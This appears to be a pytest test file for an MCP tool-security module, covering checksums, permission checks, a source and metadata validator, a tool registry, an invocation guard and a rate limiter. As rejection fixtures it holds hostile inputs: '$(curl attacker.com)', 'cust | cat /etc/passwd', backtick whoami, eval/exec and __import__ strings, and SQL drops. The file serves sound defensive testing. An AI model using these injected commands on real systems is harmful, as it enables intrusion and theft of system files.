"""
Tests for 42_mcp_security_patterns.py

Covers all five patterns (MCPToolDefinition, MCPSecurityValidator,
MCPToolRegistry, MCPInvocationGuard, MCPRateLimiter) with 80+ test cases
using only the standard library.  No external dependencies required.
"""

from __future__ import annotations

import importlib.util
import sys
import time
import types
from pathlib import Path

import pytest

_MOD_PATH = Path(__file__).parent.parent / "examples" / "42_mcp_security_patterns.py"


def _load_module() -> types.ModuleType:
    module_name = "mcp_security_patterns_42"
    if module_name in sys.modules:
        return sys.modules[module_name]
    spec = importlib.util.spec_from_file_location(module_name, _MOD_PATH)
    mod = types.ModuleType(module_name)
    sys.modules[module_name] = mod
    spec.loader.exec_module(mod)  # type: ignore[union-attr]
    return mod


@pytest.fixture(scope="module")
def mod() -> types.ModuleType:
    return _load_module()


# ===========================================================================
# Helpers
# ===========================================================================


def make_tool(
    mod: types.ModuleType,
    *,
    name: str = "read_customer",
    description: str = "Read a customer record",
    parameters: dict | None = None,
    permissions: list[str] | None = None,
    source: str = "https://crm-mcp.internal",
    checksum: str = "",
) -> object:
    return mod.MCPToolDefinition(
        name=name,
        description=description,
        parameters=parameters if parameters is not None else {"customer_id": "str"},
        permissions=permissions if permissions is not None else ["read"],
        source=source,
        checksum=checksum,
    )


def make_registry(mod: types.ModuleType, trusted_sources: list[str] | None = None):
    validator = mod.MCPSecurityValidator(trusted_sources=trusted_sources)
    return mod.MCPToolRegistry(validator), validator


# ===========================================================================
# MCPToolDefinition
# ===========================================================================


class TestMCPToolDefinition:
    # --- construction ---

    def test_basic_construction(self, mod):
        tool = make_tool(mod)
        assert tool.name == "read_customer"
        assert tool.checksum == ""

    def test_checksum_defaults_to_empty(self, mod):
        tool = make_tool(mod)
        assert tool.checksum == ""

    # --- compute_checksum ---

    def test_compute_checksum_returns_64_char_hex(self, mod):
        tool = make_tool(mod)
        cs = tool.compute_checksum()
        assert isinstance(cs, str)
        assert len(cs) == 64
        assert all(c in "0123456789abcdef" for c in cs)

    def test_compute_checksum_deterministic(self, mod):
        tool1 = make_tool(mod)
        tool2 = make_tool(mod)
        assert tool1.compute_checksum() == tool2.compute_checksum()

    def test_compute_checksum_differs_by_name(self, mod):
        tool1 = make_tool(mod, name="tool_a")
        tool2 = make_tool(mod, name="tool_b")
        assert tool1.compute_checksum() != tool2.compute_checksum()

    def test_compute_checksum_differs_by_description(self, mod):
        tool1 = make_tool(mod, description="First")
        tool2 = make_tool(mod, description="Second")
        assert tool1.compute_checksum() != tool2.compute_checksum()

    def test_compute_checksum_differs_by_parameters(self, mod):
        tool1 = make_tool(mod, parameters={"a": "str"})
        tool2 = make_tool(mod, parameters={"b": "str"})
        assert tool1.compute_checksum() != tool2.compute_checksum()

    def test_compute_checksum_parameter_order_irrelevant(self, mod):
        """Parameters are sorted before hashing — key order does not matter."""
        tool1 = make_tool(mod, parameters={"a": "str", "b": "int"})
        tool2 = make_tool(mod, parameters={"b": "int", "a": "str"})
        assert tool1.compute_checksum() == tool2.compute_checksum()

    def test_checksum_not_affected_by_source(self, mod):
        """Source is excluded from checksum so mirrors produce the same hash."""
        tool1 = make_tool(mod, source="https://server-a.internal")
        tool2 = make_tool(mod, source="https://server-b.internal")
        assert tool1.compute_checksum() == tool2.compute_checksum()

    # --- has_dangerous_permissions ---

    def test_safe_permissions_not_dangerous(self, mod):
        tool = make_tool(mod, permissions=["read", "list"])
        assert tool.has_dangerous_permissions() is False

    def test_delete_is_dangerous(self, mod):
        tool = make_tool(mod, permissions=["read", "delete"])
        assert tool.has_dangerous_permissions() is True

    def test_external_call_is_dangerous(self, mod):
        tool = make_tool(mod, permissions=["external_call"])
        assert tool.has_dangerous_permissions() is True

    def test_write_all_is_dangerous(self, mod):
        tool = make_tool(mod, permissions=["write_all"])
        assert tool.has_dangerous_permissions() is True

    def test_admin_is_dangerous(self, mod):
        tool = make_tool(mod, permissions=["admin"])
        assert tool.has_dangerous_permissions() is True

    def test_empty_permissions_not_dangerous(self, mod):
        tool = make_tool(mod, permissions=[])
        assert tool.has_dangerous_permissions() is False

    def test_compute_is_not_dangerous(self, mod):
        tool = make_tool(mod, permissions=["compute"])
        assert tool.has_dangerous_permissions() is False

    def test_write_alone_not_dangerous(self, mod):
        tool = make_tool(mod, permissions=["write"])
        assert tool.has_dangerous_permissions() is False


# ===========================================================================
# MCPSecurityValidator
# ===========================================================================


class TestMCPSecurityValidator:
    # --- validate_source ---

    def test_source_in_trusted_list_passes(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=["https://crm-mcp.internal"])
        tool = make_tool(mod, source="https://crm-mcp.internal")
        ok, reason = v.validate_source(tool)
        assert ok
        assert reason == ""

    def test_source_not_in_trusted_list_fails(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=["https://trusted.internal"])
        tool = make_tool(mod, source="https://untrusted.external")
        ok, reason = v.validate_source(tool)
        assert not ok
        assert "untrusted source" in reason

    def test_none_trusted_sources_allows_all(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=None)
        tool = make_tool(mod, source="https://any-server.example")
        ok, reason = v.validate_source(tool)
        assert ok

    def test_empty_trusted_list_rejects_all(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=[])
        tool = make_tool(mod, source="https://crm-mcp.internal")
        ok, _ = v.validate_source(tool)
        assert not ok

    # --- validate_metadata ---

    def test_clean_metadata_passes(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, name="read_customer", description="Read a record")
        ok, reason = v.validate_metadata(tool)
        assert ok
        assert reason == ""

    def test_semicolon_in_description_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="Read records; drop table users")
        ok, reason = v.validate_metadata(tool)
        assert not ok
        assert ";" in reason

    def test_pipe_in_description_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="query | exfil")
        ok, reason = v.validate_metadata(tool)
        assert not ok

    def test_dollar_in_name_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, name="tool$name")
        ok, _ = v.validate_metadata(tool)
        assert not ok

    def test_backtick_in_description_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="run `whoami`")
        ok, _ = v.validate_metadata(tool)
        assert not ok

    def test_import_injection_in_description_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="use __import__('os')")
        ok, reason = v.validate_metadata(tool)
        assert not ok
        assert "__import__" in reason

    def test_eval_injection_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="eval(malicious)")
        ok, _ = v.validate_metadata(tool)
        assert not ok

    def test_exec_injection_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="exec(payload)")
        ok, _ = v.validate_metadata(tool)
        assert not ok

    def test_subshell_dollar_paren_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="$(curl attacker.com)")
        ok, _ = v.validate_metadata(tool)
        assert not ok

    def test_brace_expansion_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="${PATH}")
        ok, _ = v.validate_metadata(tool)
        assert not ok

    # --- validate_permissions ---

    def test_allowed_permissions_pass(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, permissions=["read", "list", "compute"])
        ok, reason = v.validate_permissions(tool)
        assert ok
        assert reason == ""

    def test_unknown_permission_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, permissions=["read", "sudo"])
        ok, reason = v.validate_permissions(tool)
        assert not ok
        assert "sudo" in reason

    def test_all_allowed_permissions_pass(self, mod):
        v = mod.MCPSecurityValidator()
        all_allowed = list(mod.ALLOWED_PERMISSIONS)
        tool = make_tool(mod, permissions=all_allowed)
        ok, _ = v.validate_permissions(tool)
        assert ok

    def test_empty_permissions_pass(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, permissions=[])
        ok, _ = v.validate_permissions(tool)
        assert ok

    # --- validate_checksum ---

    def test_matching_checksum_passes(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod)
        expected = tool.compute_checksum()
        ok, reason = v.validate_checksum(tool, expected)
        assert ok
        assert reason == ""

    def test_mismatched_checksum_fails(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod)
        ok, reason = v.validate_checksum(tool, "a" * 64)
        assert not ok
        assert "mismatch" in reason

    def test_empty_expected_skips_check(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod)
        ok, reason = v.validate_checksum(tool, "")
        assert ok

    # --- validate_all ---

    def test_validate_all_returns_four_results(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=["https://crm-mcp.internal"])
        tool = make_tool(mod)
        results = v.validate_all(tool, "")
        assert len(results) == 4

    def test_validate_all_all_pass(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=["https://crm-mcp.internal"])
        tool = make_tool(mod)
        expected = tool.compute_checksum()
        results = v.validate_all(tool, expected)
        assert all(ok for ok, _ in results)

    def test_validate_all_source_fail_propagates(self, mod):
        v = mod.MCPSecurityValidator(trusted_sources=["https://other.internal"])
        tool = make_tool(mod, source="https://crm-mcp.internal")
        results = v.validate_all(tool)
        source_ok, _ = results[0]
        assert not source_ok

    def test_validate_all_metadata_fail_propagates(self, mod):
        v = mod.MCPSecurityValidator()
        tool = make_tool(mod, description="bad; injection")
        results = v.validate_all(tool)
        meta_ok, _ = results[1]
        assert not meta_ok


# ===========================================================================
# MCPToolRegistry
# ===========================================================================


class TestMCPToolRegistry:
    def _registry_with_tool(self, mod, **kwargs):
        registry, _ = make_registry(mod)
        tool = make_tool(mod, **kwargs)
        return registry, tool

    def test_register_valid_tool_returns_true(self, mod):
        registry, tool = self._registry_with_tool(mod)
        assert registry.register(tool) is True

    def test_register_stores_tool(self, mod):
        registry, tool = self._registry_with_tool(mod)
        registry.register(tool)
        assert registry.get_tool("read_customer") is not None

    def test_register_with_correct_checksum_passes(self, mod):
        registry, _ = make_registry(mod)
        tool = make_tool(mod)
        expected = tool.compute_checksum()
        assert registry.register(tool, expected_checksum=expected) is True

    def test_register_with_wrong_checksum_fails(self, mod):
        registry, _ = make_registry(mod)
        tool = make_tool(mod)
        assert registry.register(tool, expected_checksum="x" * 64) is False

    def test_register_injection_in_description_fails(self, mod):
        registry, _ = make_registry(mod)
        tool = make_tool(mod, description="do something; bad")
        assert registry.register(tool) is False
        assert not registry.is_registered("read_customer")

    def test_register_unknown_permission_fails(self, mod):
        registry, _ = make_registry(mod)
        tool = make_tool(mod, permissions=["read", "unknown_perm"])
        assert registry.register(tool) is False

    def test_register_untrusted_source_fails(self, mod):
        registry = mod.MCPToolRegistry(mod.MCPSecurityValidator(trusted_sources=["https://trusted.internal"]))
        tool = make_tool(mod, source="https://untrusted.external")
        assert registry.register(tool) is False

    def test_get_tool_returns_none_for_unknown(self, mod):
        registry, _ = make_registry(mod)
        assert registry.get_tool("nonexistent") is None

    def test_list_tools_empty_initially(self, mod):
        registry, _ = make_registry(mod)
        assert registry.list_tools() == []

    def test_list_tools_returns_sorted(self, mod):
        registry, _ = make_registry(mod)
        for name in ("tool_c", "tool_a", "tool_b"):
            t = make_tool(mod, name=name)
            registry.register(t)
        assert registry.list_tools() == ["tool_a", "tool_b", "tool_c"]

    def test_is_registered_true_after_register(self, mod):
        registry, tool = self._registry_with_tool(mod)
        registry.register(tool)
        assert registry.is_registered("read_customer") is True

    def test_is_registered_false_before_register(self, mod):
        registry, _ = make_registry(mod)
        assert registry.is_registered("read_customer") is False

    def test_unregister_returns_true_when_present(self, mod):
        registry, tool = self._registry_with_tool(mod)
        registry.register(tool)
        assert registry.unregister("read_customer") is True
        assert not registry.is_registered("read_customer")

    def test_unregister_returns_false_when_absent(self, mod):
        registry, _ = make_registry(mod)
        assert registry.unregister("nonexistent") is False

    def test_multiple_tools_registered(self, mod):
        registry, _ = make_registry(mod)
        for name in ("tool_a", "tool_b", "tool_c"):
            registry.register(make_tool(mod, name=name))
        assert len(registry.list_tools()) == 3


# ===========================================================================
# MCPInvocationGuard
# ===========================================================================


class TestMCPInvocationGuard:
    def _setup(self, mod, *, extra_params: dict | None = None):
        """Return a registry with one registered tool and a guard."""
        registry, _ = make_registry(mod)
        params = {"customer_id": "str"}
        if extra_params:
            params.update(extra_params)
        tool = make_tool(mod, parameters=params)
        registry.register(tool)
        guard = mod.MCPInvocationGuard(registry)
        return guard

    def test_valid_invocation_passes(self, mod):
        guard = self._setup(mod)
        ok, reason = guard.validate_invocation("read_customer", {"customer_id": "cust-1"})
        assert ok
        assert reason == ""

    def test_unregistered_tool_fails(self, mod):
        guard = self._setup(mod)
        ok, reason = guard.validate_invocation("nonexistent_tool", {})
        assert not ok
        assert "not registered" in reason

    def test_injection_in_argument_value_fails(self, mod):
        guard = self._setup(mod)
        ok, reason = guard.validate_invocation("read_customer", {"customer_id": "id; DROP TABLE"})
        assert not ok
        assert "injection" in reason.lower() or ";" in reason

    def test_pipe_in_argument_value_fails(self, mod):
        guard = self._setup(mod)
        ok, _ = guard.validate_invocation("read_customer", {"customer_id": "cust | cat /etc/passwd"})
        assert not ok

    def test_extra_argument_key_fails(self, mod):
        guard = self._setup(mod)
        ok, reason = guard.validate_invocation("read_customer", {"customer_id": "cust-1", "unexpected_key": "value"})
        assert not ok
        assert "unexpected" in reason

    def test_empty_arguments_passes_when_no_schema(self, mod):
        registry, _ = make_registry(mod)
        tool = make_tool(mod, parameters={})
        registry.register(tool)
        guard = mod.MCPInvocationGuard(registry)
        ok, _ = guard.validate_invocation("read_customer", {})
        assert ok

    def test_record_invocation_appends_to_log(self, mod):
        guard = self._setup(mod)
        guard.record_invocation("read_customer", {"customer_id": "c1"}, user_id="agent-1")
        log = guard.get_audit_log()
        assert len(log) == 1
        assert log[0]["tool_name"] == "read_customer"
        assert log[0]["user_id"] == "agent-1"
        assert "timestamp" in log[0]

    def test_get_audit_log_returns_copy(self, mod):
        guard = self._setup(mod)
        guard.record_invocation("read_customer", {}, user_id="agent-1")
        log = guard.get_audit_log()
        log.clear()
        assert len(guard.get_audit_log()) == 1

    def test_get_invocation_count_zero_initially(self, mod):
        guard = self._setup(mod)
        assert guard.get_invocation_count("read_customer") == 0

    def test_get_invocation_count_increments(self, mod):
        guard = self._setup(mod)
        for i in range(3):
            guard.record_invocation("read_customer", {}, user_id=f"agent-{i}")
        assert guard.get_invocation_count("read_customer") == 3

    def test_get_invocation_count_per_tool(self, mod):
        registry, _ = make_registry(mod)
        for name in ("tool_a", "tool_b"):
            registry.register(make_tool(mod, name=name, parameters={}))
        guard = mod.MCPInvocationGuard(registry)
        guard.record_invocation("tool_a", {}, user_id="u")
        guard.record_invocation("tool_a", {}, user_id="u")
        guard.record_invocation("tool_b", {}, user_id="u")
        assert guard.get_invocation_count("tool_a") == 2
        assert guard.get_invocation_count("tool_b") == 1

    def test_audit_log_argument_snapshot(self, mod):
        """Mutating args after recording should not affect the stored record."""
        guard = self._setup(mod)
        args = {"customer_id": "original"}
        guard.record_invocation("read_customer", args, user_id="u")
        args["customer_id"] = "mutated"
        log = guard.get_audit_log()
        assert log[0]["arguments"]["customer_id"] == "original"

    def test_eval_injection_in_argument_fails(self, mod):
        guard = self._setup(mod)
        ok, _ = guard.validate_invocation("read_customer", {"customer_id": "eval(bad)"})
        assert not ok


# ===========================================================================
# MCPRateLimiter
# ===========================================================================


class TestMCPRateLimiter:
    def test_check_allowed_true_initially(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=5, window_seconds=60.0)
        assert limiter.check_allowed("my_tool") is True

    def test_remaining_equals_limit_initially(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=5, window_seconds=60.0)
        assert limiter.remaining("my_tool") == 5

    def test_remaining_decrements_after_record(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=5, window_seconds=60.0)
        limiter.record_call("my_tool")
        assert limiter.remaining("my_tool") == 4

    def test_limit_reached_check_returns_false(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=3, window_seconds=60.0)
        for _ in range(3):
            limiter.record_call("my_tool")
        assert limiter.check_allowed("my_tool") is False

    def test_remaining_zero_at_limit(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=3, window_seconds=60.0)
        for _ in range(3):
            limiter.record_call("my_tool")
        assert limiter.remaining("my_tool") == 0

    def test_remaining_never_negative(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=2, window_seconds=60.0)
        for _ in range(5):
            limiter.record_call("my_tool")
        assert limiter.remaining("my_tool") == 0

    def test_set_limit_overrides_default(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=100, window_seconds=60.0)
        limiter.set_limit("sensitive_tool", 2)
        for _ in range(2):
            limiter.record_call("sensitive_tool")
        assert limiter.check_allowed("sensitive_tool") is False
        # default tool unaffected
        assert limiter.remaining("other_tool") == 100

    def test_per_tool_independent_windows(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=2, window_seconds=60.0)
        limiter.record_call("tool_a")
        limiter.record_call("tool_a")
        assert limiter.check_allowed("tool_a") is False
        assert limiter.check_allowed("tool_b") is True

    def test_sliding_window_evicts_old_timestamps(self, mod):
        """Calls made before the window should not count against the limit."""
        limiter = mod.MCPRateLimiter(default_limit=2, window_seconds=0.05)
        limiter.record_call("my_tool")
        limiter.record_call("my_tool")
        assert limiter.check_allowed("my_tool") is False
        # Wait for window to expire
        time.sleep(0.1)
        assert limiter.check_allowed("my_tool") is True
        assert limiter.remaining("my_tool") == 2

    def test_check_allowed_does_not_record(self, mod):
        """check_allowed should not consume a slot."""
        limiter = mod.MCPRateLimiter(default_limit=3, window_seconds=60.0)
        for _ in range(10):
            limiter.check_allowed("my_tool")
        assert limiter.remaining("my_tool") == 3

    def test_record_call_multiple_tools(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=5, window_seconds=60.0)
        for tool in ("tool_a", "tool_b", "tool_c"):
            limiter.record_call(tool)
        assert limiter.remaining("tool_a") == 4
        assert limiter.remaining("tool_b") == 4
        assert limiter.remaining("tool_c") == 4

    def test_set_limit_zero_always_blocked(self, mod):
        limiter = mod.MCPRateLimiter(default_limit=100, window_seconds=60.0)
        limiter.set_limit("blocked_tool", 0)
        assert limiter.check_allowed("blocked_tool") is False
        assert limiter.remaining("blocked_tool") == 0


# ===========================================================================
# Constants
# ===========================================================================


class TestConstants:
    def test_allowed_permissions_is_frozenset(self, mod):
        assert isinstance(mod.ALLOWED_PERMISSIONS, frozenset)

    def test_dangerous_permissions_is_frozenset(self, mod):
        assert isinstance(mod.DANGEROUS_PERMISSIONS, frozenset)

    def test_injection_patterns_is_list(self, mod):
        assert isinstance(mod.INJECTION_PATTERNS, list)

    def test_dangerous_not_subset_of_allowed(self, mod):
        """Some dangerous permissions (write_all, admin, root, sudo) must NOT be in allowed."""
        extras = mod.DANGEROUS_PERMISSIONS - mod.ALLOWED_PERMISSIONS
        assert len(extras) > 0

    def test_delete_and_external_call_in_both(self, mod):
        """delete and external_call are allowed (for trusted tools) but dangerous (flagged)."""
        assert "delete" in mod.ALLOWED_PERMISSIONS
        assert "delete" in mod.DANGEROUS_PERMISSIONS
        assert "external_call" in mod.ALLOWED_PERMISSIONS
        assert "external_call" in mod.DANGEROUS_PERMISSIONS

    def test_injection_patterns_contains_semicolon(self, mod):
        assert ";" in mod.INJECTION_PATTERNS

    def test_injection_patterns_contains_eval(self, mod):
        assert "eval(" in mod.INJECTION_PATTERNS
